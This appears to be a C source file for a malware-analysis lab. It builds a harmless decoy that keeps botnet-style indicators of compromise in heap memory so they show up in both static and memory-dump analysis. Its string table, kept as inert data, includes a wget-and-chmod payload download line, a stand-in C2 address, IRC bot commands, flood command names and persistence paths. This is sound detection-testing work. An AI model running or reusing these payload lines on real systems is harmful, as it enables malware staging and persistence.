/*
 * senuelo_memoria.c — SEÑUELO BENIGNO QUE DEJA SUS IOCs EN MEMORIA (NO ES MALWARE)
 * ================================================================================
 *
 * Arregla el punto ciego que vimos: con `senuelo_botnet`, los IOCs vivian en
 * `.rodata` (paginas de SOLO LECTURA respaldadas por archivo) y el
 * `coredump_filter` del kernel las EXCLUYE por defecto (0x33), asi que NO
 * aparecian en el volcado de memoria. El HEAP, en cambio, es memoria ANONIMA
 * privada y SI entra al core dump.
 *
 * Este señuelo:
 *   1. Declara los IOCs en .rodata (los ve `strings` del binario en ESTATICO).
 *   2. Los "desempaca" copiandolos al HEAP en runtime (como un botnet empacado
 *      que reconstruye su config en memoria).
 *   => Resultado: los IOCs aparecen TANTO en el analisis estatico del binario
 *      COMO en el VOLCADO DE MEMORIA del analisis dinamico.
 *
 * Sigue siendo inofensivo: NO red, NO archivos, NO exec, NO fork. Solo malloc +
 * memcpy y dormir. No libera la memoria a proposito, para que el dump la capture.
 *
 * Uso:  ./senuelo_memoria [segundos]   (def: 60)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* IOCs en .rodata: visibles en `strings` del binario (analisis estatico). */
static const char *const IOCS[] = {
    "=== INICIO_CONFIG_C2_SENUELO ===",   /* marcador facil de hallar en el dump */
    "http://192.0.2.66/bins/arm7.bin",
    "203.0.113.5:1337",
    "c2.senuelo-lab.invalid",
    "PRIVMSG #control :",
    "NICK bot-",
    "UDPFLOOD", "HTTPFLOOD", "TCPFLOOD", "GETLOCALIP", "TSUNAMI",
    "/dev/watchdog", "/bin/busybox", "TSource Engine Query", "/proc/net/tcp",
    "/etc/rc.local", "/etc/cron.hourly/",
    "wget http://192.0.2.66/bins/arm7.bin", "chmod +x /tmp/.x",
    "=== FIN_CONFIG_C2_SENUELO ===",
};
#define N_IOCS (sizeof(IOCS) / sizeof(IOCS[0]))

int main(int argc, char **argv)
{
    int segundos = (argc > 1) ? atoi(argv[1]) : 60;
    if (segundos <= 0)
        segundos = 60;

    /* "Desempaca" los IOCs al HEAP (memoria anonima => entra al core dump). */
    char **config = malloc(N_IOCS * sizeof(char *));
    for (size_t i = 0; i < N_IOCS; i++)
        config[i] = strdup(IOCS[i]);   /* strdup = malloc + copia => heap */

    printf("=== SENUELO EN MEMORIA (benigno) ===\n");
    printf("Este binario NO es malware. Solo deja %zu IOCs en el heap.\n", N_IOCS);
    printf("Deben verse en el VOLCADO DE MEMORIA (no solo en el estatico).\n");
    printf("Durmiendo de forma inofensiva durante %d s...\n", segundos);
    fflush(stdout);

    struct timespec un_segundo = {1, 0};
    for (int t = 0; t < segundos; t++) {
        nanosleep(&un_segundo, NULL);
        /* "tocar" la config para que las paginas sigan residentes en memoria */
        volatile char c = 0;
        for (size_t i = 0; i < N_IOCS; i++)
            c ^= config[i][0];
        (void)c;
        printf("latido %d/%d (config en memoria, sin actividad)\n", t + 1, segundos);
        fflush(stdout);
    }

    /* No liberamos config a proposito: queremos que el dump la capture. */
    printf("=== Fin. La muestra termino sin hacer nada. ===\n");
    return 0;
}
